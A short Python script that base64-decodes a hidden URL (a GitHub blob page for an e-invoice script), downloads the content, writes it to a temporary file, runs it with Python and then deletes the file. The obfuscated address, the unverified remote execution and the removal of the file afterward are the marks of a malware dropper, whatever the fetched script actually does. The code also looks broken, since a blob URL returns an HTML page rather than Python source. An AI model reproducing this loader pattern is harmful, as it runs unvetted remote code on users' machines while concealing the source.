import urllib.request
import subprocess
import base64

url = base64.b64decode('aHR0cHM6Ly9naXRodWIuY29tL1l1bnVzLUthcmFndW4vZS1JbnZvaWNlLUJOL2Jsb2IvbWFpbi9GYXR1cmFfQk4ucHk=').decode('utf-8')
response = urllib.request.urlopen(url)
script_content = response.read().decode('utf-8')

temp_filename = "temp.py"
with open(temp_filename, "w", encoding="utf-8") as f:
    f.write("# -*- coding: utf-8 -*-\n")
    f.write(script_content)
subprocess.run(["python", temp_filename])
import os
os.remove(temp_filename)
